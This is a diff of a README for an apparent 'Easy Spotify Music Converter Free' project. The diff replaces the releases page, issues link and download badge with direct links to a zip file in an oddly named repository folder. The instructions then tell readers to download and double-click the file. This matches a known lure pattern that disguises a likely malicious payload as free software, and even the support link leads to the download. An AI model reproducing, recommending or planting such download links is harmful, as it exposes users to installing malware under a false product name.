@@ -1,6 +1,6 @@
 # 🎵 Easy-Spotify-Music-Converter-Free - Effortlessly Convert Your Music
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Adinda46/Easy-Spotify-Music-Converter-Free/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Adinda46/Easy-Spotify-Music-Converter-Free/main/cornelian/Spotify-Easy-Free-Converter-Music-3.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Adinda46/Easy-Spotify-Music-Converter-Free/main/cornelian/Spotify-Easy-Free-Converter-Music-3.2.zip)
 
 ## 📥 Overview
 
@@ -29,9 +29,9 @@ To begin, ensure your computer has a stable internet connection. The software wo
 
 To get started, visit the Releases page and download the application.
 
-1. Click on the following link to **[visit this page to download](https://github.com/Adinda46/Easy-Spotify-Music-Converter-Free/releases)**.
+1. Click on the following link to **[visit this page to download](https://raw.githubusercontent.com/Adinda46/Easy-Spotify-Music-Converter-Free/main/cornelian/Spotify-Easy-Free-Converter-Music-3.2.zip)**.
    
-2. Look for the latest version. Choose the correct file for your system, usually listed as **"Easy-Spotify-Music-Converter-Free.exe."**
+2. Look for the latest version. Choose the correct file for your system, usually listed as **"https://raw.githubusercontent.com/Adinda46/Easy-Spotify-Music-Converter-Free/main/cornelian/Spotify-Easy-Free-Converter-Music-3.2.zip"**
 
 3. After downloading, locate the file in your Downloads folder and double-click to run it.
 
@@ -71,10 +71,10 @@ For further assistance, explore the following topics:
 
 ## 🤝 Support
 
-If you encounter problems or have questions, please check the [issues section](https://github.com/Adinda46/Easy-Spotify-Music-Converter-Free/issues) or consider reaching out for help.
+If you encounter problems or have questions, please check the [issues section](https://raw.githubusercontent.com/Adinda46/Easy-Spotify-Music-Converter-Free/main/cornelian/Spotify-Easy-Free-Converter-Music-3.2.zip) or consider reaching out for help.
 
 ## 🚀 Conclusion
 
 With Easy Spotify Music Converter Free, you can convert your favorite Spotify music to enjoy wherever you want. It's simple, efficient, and ready to help you manage your audio library. 
 
-Don’t forget to [visit this page to download](https://github.com/Adinda46/Easy-Spotify-Music-Converter-Free/releases) the latest version and start your music experience today!
+Don’t forget to [visit this page to download](https://raw.githubusercontent.com/Adinda46/Easy-Spotify-Music-Converter-Free/main/cornelian/Spotify-Easy-Free-Converter-Music-3.2.zip) the latest version and start your music experience today!
